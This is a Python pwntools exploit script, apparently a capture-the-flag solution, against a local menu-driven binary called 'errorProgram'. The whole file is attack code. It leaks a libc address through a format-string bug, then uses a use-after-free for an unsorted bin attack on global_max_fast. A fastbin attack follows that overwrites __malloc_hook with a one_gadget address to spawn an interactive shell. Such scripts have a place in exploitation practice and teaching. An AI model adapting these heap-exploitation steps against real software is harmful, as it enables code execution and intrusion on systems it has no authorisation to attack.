#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
#  context.log_level = "critical"
context.log_level = "debug"
context.binary = "./errorProgram"
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
libc.sym["main_arena"] = 0x3ebc40
libc.sym["global_max_fast"] = 0x3ed940
libc.sym["one_gadget"] = 0x10a38c

def add(idx, size):
    io.sendlineafter("YOUR CHOICE? : ", str(1))
    io.sendlineafter("INDEX? : ", str(idx))
    io.sendlineafter("SIZE? : ", str(size))

def free(idx):
    io.sendlineafter("YOUR CHOICE? : ", str(2))
    io.sendlineafter("INDEX? : ", str(idx))

def edit(idx, cont):
    io.sendlineafter("YOUR CHOICE? : ", str(3))
    io.sendlineafter("INDEX? : ", str(idx))
    io.sendafter("DATA : ", cont)
    sleep(0.01)

def show(idx):
    io.sendlineafter("YOUR CHOICE? : ", str(4))
    io.sendlineafter("INDEX? : ", str(idx))

def fsb(payload):
    io.sendlineafter("YOUR CHOICE? : ", str(2))
    io.sendafter("Input your payload : ", payload)
    sleep(0.01)

def bof(payload):
    io.sendlineafter("YOUR CHOICE? : ", str(1))
    io.sendafter("Input your payload : ", payload)
    sleep(0.01)



def DEBUG():
    cmd = '''
    bpie 0xFF0
    bpie 0xF68
    bpie 0x109A
    c
    '''
    gdb.attach(io, cmd)
    sleep(0.5)



io = process("./errorProgram")

fsb(cyclic(0x110, n = 8))
libc.address = u64(io.recvuntil("\x7f")[-6: ] + b'\0\0') - libc.sym["_IO_2_1_stdout_"]
print("libc @ {:#x}".format(libc.address))
size = ((libc.address >> 32) & ~0xf) - 0x10
print("size @ {:#x}".format(size))

# enter UAF
io.sendlineafter("YOUR CHOICE? : ", "3")

add(0, 0x800)
add(1, size)
free(0)

# unsorted bin attack
show(0)
edit(0, flat(libc.sym["main_arena"] + 96, libc.sym["global_max_fast"] - 0x10))
io.sendlineafter("YOUR CHOICE? : ", "9" * 0x400)

# fastbin attack
DEBUG()
free(1)

#  edit(1, flat(libc.sym["__malloc_hook"] - 0x19c))
edit(1, flat(libc.sym["__malloc_hook"] - 0x14))

add(2, size)
add(3, size)
edit(3, flat('\0' * 4, libc.sym["one_gadget"]))
print("one_gadget @ {:#x}".format(libc.sym["one_gadget"]))

io.sendlineafter("YOUR CHOICE? : ", "9" * 0x400)
#  io.sendlineafter("YOUR CHOICE? : ", "5")


io.interactive()
